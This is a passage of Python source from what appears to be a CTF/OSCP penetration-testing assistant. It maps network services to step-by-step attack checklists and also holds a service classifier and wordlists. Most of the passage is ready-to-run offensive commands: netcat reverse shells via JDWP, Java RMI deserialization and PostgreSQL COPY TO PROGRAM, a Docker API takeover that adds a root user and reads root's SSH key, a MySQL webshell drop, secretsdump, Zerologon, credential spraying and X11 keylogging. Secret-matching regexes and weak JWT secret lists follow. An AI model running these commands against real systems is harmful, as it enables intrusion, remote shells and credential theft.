            "curl -sk -u <USER>:<PASS> http://<RHOST>:15672/api/queues | jq '.[].name'",
        ],
        4: [
            "# Erlang cookie (with epmd 4369) → RabbitMQ node RCE",
        ],
        5: [
            "# HackTricks AMQP: https://book.hacktricks.xyz/network-services-pentesting/5671-5672-pentesting-amqp",
        ],
    },
    "epmd": {
        1: [
            "epmd -d -names   # or: nmap -p4369 --script epmd-info <RHOST>",
        ],
        2: [
            "cat ~/.erlang.cookie 2>/dev/null; find / -name .erlang.cookie 2>/dev/null",
        ],
        3: [
            "# with a cookie: erl -sname pwn -setcookie <COOKIE> -remsh <NODE>@<RHOST>  then os:cmd(\"id\").",
        ],
        4: [
            "# common on RabbitMQ / CouchDB clusters — pivot into those",
        ],
        5: [
            "# HackTricks EPMD: https://book.hacktricks.xyz/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd",
        ],
    },
    "docker": {
        1: [
            "curl -sk http://<RHOST>:2375/version",
            "docker -H tcp://<RHOST>:2375 info",
        ],
        2: [
            "docker -H tcp://<RHOST>:2375 ps -a",
            "docker -H tcp://<RHOST>:2375 images",
        ],
        3: [
            "docker -H tcp://<RHOST>:2375 run -it --rm -v /:/host alpine chroot /host sh",
        ],
        4: [
            "docker -H tcp://<RHOST>:2375 run -v /:/host alpine sh -c 'echo \"pwn::0:0::/root:/bin/sh\" >> /host/etc/passwd'",
        ],
        5: [
            "docker -H tcp://<RHOST>:2375 run --rm -v /:/host alpine sh -c 'cat /host/root/.ssh/id_rsa'",
        ],
        6: [
            "# HackTricks Docker API: https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker",
        ],
    },
    "jdwp": {
        1: [
            "nmap -sV -p<RPORT> <RHOST>   # JDWP-Handshake in the banner",
        ],
        2: [
            "python3 jdwp-shellifier.py -t <RHOST> -p <RPORT> --cmd 'id'",
        ],
        3: [
            "python3 jdwp-shellifier.py -t <RHOST> -p <RPORT> --cmd 'nc <LHOST> <LPORT> -e /bin/sh'",
        ],
        4: [
            "# HackTricks JDWP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-jdwp-java-debug-wire-protocol",
        ],
    },
    "rmi": {
        1: [
            "nmap -sV -p<RPORT> --script rmi-dumpregistry <RHOST>",
            "java -jar BaRMIe.jar -enum <RHOST> <RPORT>",
        ],
        2: [
            "java -jar ysoserial.jar CommonsCollections5 'nc <LHOST> <LPORT> -e /bin/sh' > payload.bin",
            "java -cp BaRMIe.jar Attacks.RMIObjectRefDeserialize <RHOST> <RPORT> payload.bin",
        ],
        3: [
            "msfconsole -q -x 'use exploit/multi/misc/java_jmx_server; set RHOSTS <RHOST>; set RPORT <RPORT>; run'",
        ],
        4: [
            "# HackTricks RMI: https://book.hacktricks.xyz/network-services-pentesting/1099-pentesting-java-rmi",
        ],
    },
    "ajp": {
        1: [
            "nmap -sV -p8009 <RHOST>",
        ],
        2: [
            "python3 ajpShooter.py http://<RHOST>:8080 8009 /WEB-INF/web.xml read",
            "msfconsole -q -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS <RHOST>; run'",
        ],
        3: [
            "python3 ajpShooter.py http://<RHOST>:8080 8009 /<PATH>.jsp eval",
        ],
        4: [
            "# HackTricks AJP: https://book.hacktricks.xyz/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp",
        ],
    },
    "clamav": {
        1: [
            "nc -nv <RHOST> 3310   # then send: PING / VERSION",
        ],
        2: [
            "searchsploit clamav",
            "msfconsole -q -x 'search clamav'",
        ],
        3: [
            "# use the RCE to stage a reverse shell as the clamav user",
        ],
        4: [
            "# HackTricks ClamAV: https://book.hacktricks.xyz/network-services-pentesting/3310-pentesting-clamav",
        ],
    },
    "svn": {
        1: [
            "svn info svn://<RHOST>/",
            "svn ls -R svn://<RHOST>/",
        ],
        2: [
            "svn checkout svn://<RHOST>/ ./svn-loot",
            "svn log -v svn://<RHOST>/",
        ],
        3: [
            "svn cat -r <REV> svn://<RHOST>/<PATH>",
            "svn up -r <REV>",
        ],
        4: [
            "# HackTricks SVN: https://book.hacktricks.xyz/network-services-pentesting/3690-pentesting-subversion-svn-server",
        ],
    },
    "mysql": {
        1: [
            "mysql -h <RHOST> -P <RPORT> -u root --skip-ssl -e 'select version();'",
            "nmap -sV -p<RPORT> --script mysql-info <RHOST>",
            "searchsploit mysql <VERSION>",
        ],
        2: [
            "mysql -h <RHOST> -u root --skip-ssl   # blank password",
            "hydra -L <USERLIST> -P <PASSLIST> mysql://<RHOST>:<RPORT>",
            "nmap -p<RPORT> --script mysql-brute <RHOST>",
        ],
        3: [
            "mysql -h <RHOST> -u <USER> -p<PASS> -e 'show databases; select user,authentication_string from mysql.user;'",
            "nmap -p<RPORT> --script mysql-dump-hashes --script-args username=<USER>,password=<PASS> <RHOST>",
        ],
        4: [
            "mysql -h <RHOST> -u <USER> -p<PASS> -e \"select '<?php system($_GET[0]);?>' into outfile '/var/www/html/sh.php';\"",
        ],
        5: [
            "# HackTricks MySQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql",
        ],
    },
    "mssql": {
        1: [
            "nmap -sU -p1434 --script ms-sql-info <RHOST>",
            "impacket-mssqlclient <USER>:<PASS>@<RHOST> -windows-auth",
        ],
        2: [
            "nxc mssql <RHOST> -u <USERLIST> -p <PASSLIST> --continue-on-success",
            "nxc mssql <RHOST> -u sa -p ''",
        ],
        3: [
            "nxc mssql <RHOST> -u <USER> -p <PASS> -x 'whoami'",
            "impacket-mssqlclient <USER>:<PASS>@<RHOST>   # then: enable_xp_cmdshell ; xp_cmdshell whoami",
        ],
        4: [
            "nxc mssql <RHOST> -u <USER> -p <PASS> -q 'SELECT name FROM sys.databases'",
            "# OPENROWSET file read + linked-server enumeration inside mssqlclient",
        ],
        5: [
            "# HackTricks MSSQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server",
        ],
    },
    "psql": {
        1: [
            "PGPASSWORD=<PASS> psql -h <RHOST> -p <RPORT> -U postgres -c 'select version();'",
            "nmap -sV -p<RPORT> --script pgsql-brute <RHOST>",
        ],
        2: [
            "PGPASSWORD=postgres psql -h <RHOST> -U postgres -c 'select 1'",
            "hydra -L <USERLIST> -P <PASSLIST> postgres://<RHOST>:<RPORT>",
        ],
        3: [
            "PGPASSWORD=<PASS> psql -h <RHOST> -U <USER> -c '\\l'  # then \\du ; select * from pg_shadow;",
            "PGPASSWORD=<PASS> psql -h <RHOST> -U <USER> -c \"select pg_read_file('/etc/passwd');\"",
        ],
        4: [
            "PGPASSWORD=<PASS> psql -h <RHOST> -U <USER> -c \"COPY (SELECT '') TO PROGRAM 'nc <LHOST> <LPORT> -e /bin/sh';\"",
        ],
        5: [
            "# HackTricks PostgreSQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql",
        ],
    },
    "oracle": {
        1: [
            "nmap -sV -p1521 --script oracle-tns-version <RHOST>",
            "tnscmd10g version -h <RHOST>",
        ],
        2: [
            "nmap -p1521 --script oracle-sid-brute <RHOST>",
            "odat sidguesser -s <RHOST> -p 1521",
        ],
        3: [
            "odat passwordguesser -s <RHOST> -p 1521 -d <SID>",
            "nmap -p1521 --script oracle-brute --script-args oracle-brute.sid=<SID> <RHOST>",
        ],
        4: [
            "# HackTricks Oracle: https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener",
        ],
    },
    "mqtt": {
        1: [
            "mosquitto_sub -h <RHOST> -p 1883 -t '#' -v",
        ],
        2: [
            "mosquitto_sub -h <RHOST> -p 1883 -t '$SYS/#' -v",
        ],
        3: [
            "mosquitto_pub -h <RHOST> -p 1883 -t '<PATH>' -m '<COMMAND>'",
        ],
        4: [
            "mosquitto_sub -h <RHOST> -p 1883 -u <USER> -P <PASS> -t '#' -v",
        ],
        5: [
            "# HackTricks MQTT: https://book.hacktricks.xyz/network-services-pentesting/1883-pentesting-mqtt-mosquitto",
        ],
    },
    "ldap": {
        1: [
            "nxc ldap <RHOST> -u '' -p '' --users",
            "ldapsearch -x -H ldap://<RHOST> -b 'DC=<DOMAIN>' -s base namingcontexts",
            "windapsearch -d <DOMAIN> --dc-ip <RHOST> -u '' -U",
        ],
        2: [
            "nxc ldap <RHOST> -u <USER> -p <PASS> --asreproast asrep.txt",
            "nxc ldap <RHOST> -u <USER> -p <PASS> --kerberoasting kerb.txt",
        ],
        3: [
            "nxc ldap <RHOST> -u <USER> -p <PASS> -M laps",
            "bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -ns <RHOST> -c All",
        ],
        4: [
            "# HackTricks LDAP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap",
        ],
    },
    "kerberos": {
        1: [
            "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>' <RHOST>",
            "kerbrute userenum -d <DOMAIN> --dc <RHOST> <USERLIST>",
        ],
        2: [
            "impacket-GetNPUsers <DOMAIN>/ -dc-ip <RHOST> -usersfile <USERLIST> -no-pass",
            "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <RHOST> -request",
        ],
        3: [
            "kerbrute passwordspray -d <DOMAIN> --dc <RHOST> <USERLIST> '<PASS>'",
        ],
        4: [
            "# HackTricks Kerberos: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast",
        ],
    },
    "msrpc": {
        1: [
            "impacket-rpcdump <RHOST>",
            "rpcdump.py <RHOST> | grep -i -E 'MS-RPRN|MS-EFSR|MS-DFSNM'",
        ],
        2: [
            "rpcclient -U '' -N <RHOST> -c 'enumdomusers;querydominfo;lsaquery'",
            "impacket-samrdump <DOMAIN>/<USER>:<PASS>@<RHOST>",
        ],
        3: [
            "python3 PetitPotam.py -u <USER> -p <PASS> <LHOST> <RHOST>",
            "coercer coerce -u <USER> -p <PASS> -t <RHOST> -l <LHOST>",
        ],
        4: [
            "nxc smb <RHOST> -u <USER> -p <PASS> -M zerologon",
        ],
        5: [
            "impacket-atexec <DOMAIN>/<USER>:<PASS>@<RHOST> '<COMMAND>'",
            "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<RHOST>",
        ],
        6: [
            "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<RHOST> -just-dc",
        ],
        7: [
            "# HackTricks MSRPC: https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc",
        ],
    },
    "snmp": {
        1: [
            "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <RHOST>",
            "nmap -sU -p161 --script snmp-brute <RHOST>",
        ],
        2: [
            "snmpwalk -v2c -c <COMMUNITY> <RHOST>",
            "snmp-check -c <COMMUNITY> <RHOST>",
        ],
        3: [
            "snmpwalk -v2c -c <COMMUNITY> <RHOST> 1.3.6.1.2.1.25.4.2.1.2   # running processes",
            "snmpwalk -v2c -c <COMMUNITY> <RHOST> hrSWInstalledName",
        ],
        4: [
            "snmpwalk -v2c -c <COMMUNITY> <RHOST> 1.3.6.1.4.1.9.9.96   # Cisco config exfil",
        ],
        5: [
            "snmpset -v2c -c <COMMUNITY> <RHOST> 'nsExtendStatus.\"pwn\"' i 4 ...   # NET-SNMP EXTEND → RCE",
        ],
        6: [
            "nmap -sU -p161 --script snmp-brute,snmpv3-* <RHOST>",
        ],
        7: [
            "# HackTricks SNMP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp",
        ],
    },
    "ipmi": {
        1: [
            "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <RHOST>; run'",
        ],
        2: [
            "hashcat -m 7300 ipmi-hashes.txt <WORDLIST>",
        ],
        3: [
            "ipmitool -I lanplus -C 0 -H <RHOST> -U root -P '' user list",
        ],
        4: [
            "ipmitool -I lanplus -H <RHOST> -U ADMIN -P ADMIN chassis status",
        ],
        5: [
            "# HackTricks IPMI: https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi",
        ],
    },
    "dns": {
        1: [
            "dig axfr @<RHOST> <DOMAIN>",
            "fierce --domain <DOMAIN> --dns-servers <RHOST>",
        ],
        2: [
            "dig version.bind chaos txt @<RHOST>",
        ],
        3: [
            "dnsrecon -d <DOMAIN> -n <RHOST> -t brt -D <WORDLIST>",
            "dnsenum --dnsserver <RHOST> <DOMAIN>",
        ],
        4: [
            "# note internal names for /etc/hosts + vhost routing; test dynamic-update / cache poisoning",
        ],
        5: [
            "# HackTricks DNS: https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns",
        ],
    },
    "smtp": {
        1: [
            "nc -nv <RHOST> 25   # EHLO x",
            "nmap -sV -p25 --script smtp-commands <RHOST>",
            "searchsploit <PRODUCT> <VERSION>",
        ],
        2: [
            "smtp-user-enum -M RCPT -U <USERLIST> -D <DOMAIN> -t <RHOST>",
            "smtp-user-enum -M VRFY -U <USERLIST> -t <RHOST>",
        ],
        3: [
            "nmap -p25 --script smtp-open-relay <RHOST>",
            "swaks --to <EMAIL> --from admin@<DOMAIN> --server <RHOST>",
        ],
        4: [
            "swaks --to <EMAIL> --from <USER>@<DOMAIN> --server <RHOST> --auth-user <USER> --auth-password <PASS>",
        ],
        5: [
            "# Exim CVE-2019-10149 / template injection → shell as the mail service",
            "msfconsole -q -x 'search <PRODUCT>'",
        ],
        6: [
            "swaks --to <EMAIL> --from attacker@<DOMAIN> --server <RHOST> --attach @payload.doc",
        ],
        7: [
            "# HackTricks SMTP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp",
        ],
    },
    "mail2": {
        1: [
            "nc -nv <RHOST> 110   # POP3   |   nc -nv <RHOST> 143   # IMAP",
            "searchsploit <PRODUCT> <VERSION>",
        ],
        2: [
            "hydra -L <USERLIST> -P <PASSLIST> pop3://<RHOST>",
            "hydra -L <USERLIST> -P <PASSLIST> imap://<RHOST>",
        ],
        3: [
            "curl -sk 'pop3://<RHOST>' -u '<USER>:<PASS>'   # then RETR n",
            "curl -sk 'imap://<RHOST>/INBOX' -u '<USER>:<PASS>'",
        ],
        4: [
            "# HackTricks POP3: https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop",
        ],
    },
    "telnet": {
        1: [
            "nc -nv <RHOST> <RPORT>",
            "nmap -sV -p<RPORT> --script telnet-ntlm-info <RHOST>",
        ],
        2: [
            "hydra -L <USERLIST> -P <PASSLIST> telnet://<RHOST>:<RPORT> -f",
        ],
        3: [
            "# passive: sniff cleartext creds on the wire (tcpdump / wireshark)",
        ],
        4: [
            "# HackTricks Telnet: https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet",
        ],
    },
    "irc": {
        1: [
            "nc -nv <RHOST> <RPORT>   # NICK x ; USER x x x x",
        ],
        2: [
            "msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS <RHOST>; run'",
        ],
        3: [
            "searchsploit unrealircd",
        ],
        4: [
            "# HackTricks IRC: https://book.hacktricks.xyz/network-services-pentesting/pentesting-irc",
        ],
    },
    "rdp": {
        1: [
            "nxc rdp <RHOST>",
            "nmap -p3389 --script rdp-ntlm-info,rdp-vuln-ms12-020 <RHOST>",
        ],
        2: [
            "nxc rdp <RHOST> -u <USERLIST> -p <PASSLIST> --continue-on-success",
            "nxc rdp <RHOST> -u <USER> -H <NTHASH>",
        ],
        3: [
            "xfreerdp /v:<RHOST> /u:<USER> /p:<PASS> +clipboard /dynamic-resolution",
        ],
    },
    "vnc": {
        1: [
            "nmap -p<RPORT> --script vnc-info,realvnc-auth-bypass <RHOST>",
        ],
        2: [
            "nxc vnc <RHOST> -p <PASSLIST>",
            "hydra -P <PASSLIST> vnc://<RHOST>:<RPORT>",
        ],
        3: [
            "vncviewer <RHOST>::<RPORT>",
        ],
    },
    "ssh": {
        1: [
            "nc -nv <RHOST> <RPORT>",
            "ssh -Q kex <RHOST>   # or: nmap -p<RPORT> --script ssh2-enum-algos,ssh-auth-methods <RHOST>",
            "searchsploit <PRODUCT> <VERSION>",
        ],
        2: [
            "hydra -L <USERLIST> -P <PASSLIST> ssh://<RHOST>:<RPORT> -t 4 -f",
            "ssh -i <KEYFILE> <USER>@<RHOST> -p <RPORT>",
        ],
        3: [
            "# HackTricks SSH: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh",
        ],
    },
    "squid": {
        1: [
            "curl -sk -x http://<RHOST>:3128 http://<TARGET-INTERNAL>/",
            "# proxychains: add 'http <RHOST> 3128' to /etc/proxychains4.conf",
        ],
        2: [
            "proxychains nmap -sT -Pn -n <TARGET-INTERNAL>",
        ],
        3: [
            "curl -sk -x http://<RHOST>:3128 'cache_object://<RHOST>/menu'",
        ],
        4: [
            "curl -sk -x http://<RHOST>:3128 --proxy-user <USER>:<PASS> http://<TARGET-INTERNAL>/",
        ],
        5: [
            "# HackTricks Squid: https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid",
        ],
    },
    "cups": {
        1: [
            "curl -sk http://<RHOST>:631/",
            "nmap -p631 --script http-title <RHOST>",
        ],
        2: [
            "# CVE-2024-47176 chain: crafted IPP printer → RCE (evaluate carefully)",
            "searchsploit cups",
        ],
        3: [
            "curl -sk http://<RHOST>:631/printers/",
        ],
        4: [
            "# HackTricks CUPS: https://book.hacktricks.xyz/network-services-pentesting/pentesting-ipp",
        ],
    },
    "jetdirect": {
        1: [
            "python3 pret.py <RHOST> pjl",
        ],
        2: [
            "python3 pret.py <RHOST> pjl   # then: ls / get /etc/passwd / nvram dump",
        ],
        3: [
            "# extract stored LDAP/SMB pass-back creds and captured print jobs via PRET",
        ],
        4: [
            "# HackTricks Printers: https://book.hacktricks.xyz/network-services-pentesting/9100-pjl",
        ],
    },
    "rservices": {
        1: [
            "rlogin -l <USER> <RHOST>",
            "rsh <RHOST> -l <USER> id",
        ],
        2: [
            "rsh <RHOST> -l root id   # abuse ~/.rhosts or /etc/hosts.equiv trust",
        ],
        3: [
            "# HackTricks r-services: https://book.hacktricks.xyz/network-services-pentesting/512-pentesting-rexec",
        ],
    },
    "x11": {
        1: [
            "xdpyinfo -display <RHOST>:0",
            "nmap -p6000 --script x11-access <RHOST>",
        ],
        2: [
            "xwd -root -display <RHOST>:0 -out screen.xwd && convert screen.xwd screen.png",
        ],
        3: [
            "xdotool --display <RHOST>:0 key --window $(xdotool search --name . | head -1) ...",
            "# keylog: xspy <RHOST>:0",
        ],
        4: [
            "# HackTricks X11: https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11",
        ],
    },
    "finger": {
        1: [
            "finger @<RHOST>",
            "finger root@<RHOST>",
        ],
        2: [
            "finger-user-enum.pl -U <USERLIST> -t <RHOST>",
        ],
        3: [
            "# HackTricks Finger: https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger",
        ],
    },
    "ident": {
        1: [
            "ident-user-enum <RHOST> 22 80 443 3306",
        ],
        2: [
            "# map services → local users, then target brute/spray on the juiciest",
        ],
        3: [
            "# HackTricks Ident: https://book.hacktricks.xyz/network-services-pentesting/113-pentesting-ident",
        ],
    },
    "rtsp": {
        1: [
            "nmap -p554 --script rtsp-url-brute <RHOST>",
            "cameradar -t <RHOST>",
        ],
        2: [
            "ffplay rtsp://<USER>:<PASS>@<RHOST>:554/<PATH>",
        ],
        3: [
            "searchsploit <PRODUCT>",
        ],
        4: [
            "# HackTricks RTSP: https://book.hacktricks.xyz/network-services-pentesting/554-8554-pentesting-rtsp",
        ],
    },
    "sip": {
        1: [
            "svmap <RHOST>",
            "svwar -m INVITE -e 100-999 <RHOST>",
        ],
        2: [
            "svcrack -u <EXTENSION> -d <PASSLIST> <RHOST>",
        ],
        3: [
            "# sniff SIP creds; test toll fraud / call interception",
        ],
        4: [
            "# HackTricks VoIP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-voip",
        ],
    },
    "nntp": {
        1: [
            "nc -nv <RHOST> 119   # then: HELP / LIST",
            "searchsploit <PRODUCT> <VERSION>",
        ],
        2: [
            "# LIST newsgroups ; GROUP <name> ; ARTICLE n",
        ],
        3: [
            "# try AUTHINFO USER/PASS and posting; check for auth bypass",
        ],
        4: [
            "# HackTricks NNTP: https://book.hacktricks.xyz/network-services-pentesting/pentesting-nntp",
        ],
    },
    "other": {
        1: [
            "nc -nv <RHOST> <RPORT>",
            "openssl s_client -connect <RHOST>:<RPORT>",
        ],
        2: [
            "searchsploit <PRODUCT> <VERSION>",
        ],
        3: [
            "# look the port/protocol up in HackTricks: https://book.hacktricks.xyz/network-services-pentesting",
        ],
        4: [
            "nmap -sV -p<RPORT> <RHOST>",
        ],
        5: [
            "nmap -sV -p<RPORT> --script '<PROTO>-*' <RHOST>",
        ],
        6: [
            "# interact manually to understand the protocol; note it for deeper research",
        ],
        7: [
            "# HackTricks index: https://book.hacktricks.xyz/network-services-pentesting",
        ],
    },
}


def _classify_service(port: int, name, product, version, cpe) -> tuple:
    """Resolve one open port to a service class by the cascade CPE → product/version →
    service name → port default. Returns (label, key, signal) where signal names the
    level that matched (cpe / version / service / port) — a proxy for how much to trust
    it (a port-only guess is far weaker than a CPE/version fingerprint)."""
    sources = (
        ("cpe",     (cpe or "").lower()),
        ("version", f"{product or ''} {version or ''}".lower()),
        ("service", (name or "").lower()),
    )
    for signal, text in sources:
        if not text.strip():
            continue
        for key, label, _ports, tokens in _EXPLOIT_SERVICES:
            if any(tok in text for tok in tokens):
                return label, key, signal
    for key, label, ports, _tokens in _EXPLOIT_SERVICES:
        if port in ports:
            return label, key, "port"
    # unrecognised: still show nmap's own service name if it gave one (so the row is
    # useful for research), else a bare 'other'. Stays keyed 'other' → ranked last, no tool.
    if name:
        return name, _EXPLOIT_UNKNOWN[0], "service"
    return _EXPLOIT_UNKNOWN[1], _EXPLOIT_UNKNOWN[0], "port"


def _exploit_targets(ip: str) -> list:
    """The host's services in exploitation-priority order (no output): a list of
    (port, proto, label, key, ver, signal). Shared by the render and the progress view."""
    services = fetch_services(ip)
    triaged = []
    for port, proto, _state in fetch_ports(ip):
        name, product, version, cpe = services.get((port, proto), (None, None, None, None))
        label, key, signal = _classify_service(port, name, product, version, cpe)
        rank = _EXPLOIT_RANK.get(key, len(_EXPLOIT_SERVICES))
        ver = " ".join(x for x in (product, version) if x)
        triaged.append((rank, port, proto, label, key, ver, signal))
    triaged.sort(key=lambda t: (t[0], t[1]))
    return [(port, proto, label, key, ver, signal)
            for _rank, port, proto, label, key, ver, signal in triaged]


def _service_steps_complete(ip: str, port: int, proto: str, key: str) -> bool:
    """True when every checklist step for this service is resolved (done or skip) — the
    condition for turning the service (and, when all are, phase 6) green."""
    steps = _EXPLOIT_STEPS.get(key) or _EXPLOIT_STEPS["other"]
    status = fetch_step_status(ip, port, proto, key)
    return bool(steps) and all(status.get(i) in ("done", "skip")
                               for i in range(1, len(steps) + 1))


def _render_exploit_targets(ip: str) -> list:
    """Numbered, priority-ordered list of the host's services worth attacking (best
    CTF/OSCP candidates first). A service whose whole checklist is resolved shows green.
    Returns the ordered targets so a number can pick one."""
    print(f"\n{BOLD}{ip} — service exploitation{RESET}")
    if not fetch_ports(ip):
        print(f"  {DIM}no open ports recorded — run {BOLD}[1] Port enumeration{RESET}"
              f"{DIM} first{RESET}")
        return []
    targets = _exploit_targets(ip)
    rows = []
    for i, (port, proto, label, key, ver, signal) in enumerate(targets, 1):
        # '?' flags a label not confirmed by a -sV version/CPE fingerprint (a service-name
        # or port guess), so it's clear which rows to verify before trusting them.
        name = label + ("?" if signal in ("service", "port") else "")
        disp = f"{GREEN}{name}{RESET}" if _service_steps_complete(ip, port, proto, key) else name
        rows.append([str(i), disp, f"{port}/{proto}", _cell(ver or "—", 30), f"via {signal}"])
    print(_box_table(["#", "SERVICE", "PORT", "VERSION", "SIGNAL"], rows,
                     aligns=["r", "l", "l", "l", "l"]))
    hostnames = fetch_hostnames(ip)
    if hostnames:
        names = ", ".join(hn for hn, _p, _s in hostnames)
        print(f"  {DIM}hostnames (→ /etc/hosts, vhost-fuzz): {RESET}{CYAN}{names}{RESET}")
    return targets


def _step_parts(step) -> tuple:
    """Normalise a checklist entry to (description, tool_key). A plain string has no
    tool; a (description, tool_key) tuple points at a runner in _STEP_TOOLS."""
    if isinstance(step, tuple):
        return step[0], step[1]
    return step, None


_SPLOIT_INTERESTING = {   # whatweb plugin names worth an Exploit-DB lookup (when versioned)
    "apache", "nginx", "microsoft-iis", "litespeed", "openresty", "tomcat", "jetty",
    "php", "wordpress", "drupal", "joomla", "magento", "mediawiki", "typo3", "moodle",
    "jenkins", "jira", "gitlab", "phpmyadmin", "openssl", "openssh",
}


_SECRET_PATTERNS = [   # conservative set — fixed-format keys first, then noisier assignments
    ("aws-key",     r"AKIA[0-9A-Z]{16}"),
    ("google-api",  r"AIza[0-9A-Za-z_\-]{35}"),
    ("slack-token", r"xox[baprs]-[0-9A-Za-z-]{10,}"),
    ("jwt",         r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}"),
    ("bearer",      r"[Aa]uthorization[\"']?\s*[:=]\s*[\"']?Bearer\s+[A-Za-z0-9._\-]+"),
    ("private-key", r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----"),
    ("assignment",  r"(?i)(?:api[_-]?key|secret|token|password|passwd|pwd)"
                    r"[\"']?\s*[:=]\s*[\"'][^\"']{6,60}[\"']"),
]


_ERROR_TECH = [   # framework signatures that leak from an error/404 page body
    ("Werkzeug/Flask", r"Werkzeug|Traceback \(most recent call last\)"),
    ("Django",         r"Django|You're seeing this error because"),
    ("Laravel/Symfony", r"Laravel|Symfony|Whoops"),
    ("ASP.NET",        r"ASP\.NET|Server Error in .*? Application"),
    ("Java/Tomcat",    r"Apache Tomcat|javax\.servlet|java\.lang\."),
    ("Express",        r"Cannot (?:GET|POST) /|X-Powered-By: Express"),
    ("Rails",          r"Ruby on Rails|Action Controller"),
    ("PHP",            r"Fatal error:|Warning:.*?on line|<b>Notice</b>"),
]


_JWT_WEAK_SECRETS = [   # small curated list — a trivial-secret check, not a full crack (hashcat)
    "secret", "password", "changeme", "admin", "jwt", "key", "private", "your-256-bit-secret",
    "your_jwt_secret", "supersecret", "s3cr3t", "secretkey", "secret123", "password123",
    "12345678", "qwerty", "test", "dev", "default", "token", "mysecret", "jwtsecret",
    "jsonwebtoken", "shhhh", "topsecret", "letmein", "root", "pass", "hmac", "signature",
    "verysecret", "sign", "secretpassword", "iloveyou", "abc123", "welcome", "ChangeMe!",
]


# vhost/subdomain wordlists, best first — the runner uses the first that exists on disk,
# else a small builtin fallback so the tool always has something to sweep.
_VHOST_WORDLISTS = [
    ("seclists top-20000",     "/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"),
    ("seclists top-5000",      "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
    ("seclists bitquark-100k", "/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"),
    ("seclists n0kovo-small",  "/usr/share/seclists/Discovery/DNS/n0kovo_subdomains/n0kovo_subdomains_small.txt"),
    ("amass top-20000",        "/usr/share/wordlists/amass/subdomains-top1mil-20000.txt"),
    ("amass top-5000",         "/usr/share/wordlists/amass/subdomains-top1mil-5000.txt"),
    ("dnsmap",                 "/usr/share/wordlists/dnsmap.txt"),
]
_VHOST_BUILTIN = [   # ultimate fallback: common internal / CTF vhost labels
    "www", "dev", "development", "staging", "stage", "test", "testing", "uat", "qa",
    "admin", "administrator", "api", "api-dev", "internal", "intranet", "corp", "portal",
    "dashboard", "app", "apps", "web", "webmail", "mail", "smtp", "vpn", "git", "gitlab",
    "jenkins", "jira", "confluence", "grafana", "kibana", "prometheus", "db", "database",
    "phpmyadmin", "backup", "old", "beta", "demo", "static", "cdn", "files", "upload",
    "storage", "auth", "sso", "login", "secure", "monitor", "status", "support",
]
_VHOST_DEADLINE = 600         # s — hard wall-clock cap across every pass
_VHOST_THREADS = 30
_VHOST_REQ_TIMEOUT = 5
_VHOST_MAX_CANDIDATES = 25000  # sanity cap on words per pass


# directory/file wordlists for content discovery, best first — each entry may list several
# files (merged if present); the runner uses the first entry that has any file on disk.
_DIRB_WORDLISTS = [
    ("seclists raft-medium", ["/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
                              "/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt"]),
    ("seclists dirlist-2.3-medium", ["/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"]),
    ("seclists common", ["/usr/share/seclists/Discovery/Web-Content/common.txt"]),
    ("dirb common", ["/usr/share/wordlists/dirb/common.txt"]),
    ("dirb big", ["/usr/share/wordlists/dirb/big.txt"]),
    ("dirbuster small", ["/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"]),
]
_DIRB_BUILTIN = [   # ultimate fallback: common dirs / files worth a look
    "admin", "administrator", "login", "dashboard", "api", "uploads", "upload", "images",
    "assets", "static", "backup", "backups", "config", "includes", "inc", "tmp", "test",
    "dev", "old", "private", "secret", "data", "db", "sql", "logs", "log", "wp-admin",
    "wp-content", "phpmyadmin", "server-status", "robots.txt", "sitemap.xml", ".git",
    ".env", ".htaccess", "web.config", "config.php", "info.php", "phpinfo.php", "index.php",
]
_DIRB_EXTS = ["php", "asp", "aspx", "txt", "bak", "zip", "html", "old"]
_DIRB_DEADLINE = 900          # s — hard wall-clock cap across all targets
_DIRB_THREADS = 30
_DIRB_REQ_TIMEOUT = 5
_DIRB_MAX_WORDS = 20000       # sanity cap on words per target
_DIRB_SENSITIVE = re.compile(
    r"\.(bak|zip|old|sql|tar|gz|tgz|env|git|svn|conf|config|pem|key)\b"
    r"|/(backup|admin|config|\.git|\.env|\.svn)", re.I)


# known high-value exposures: (path, body-signature | None, high-severity?). The signature
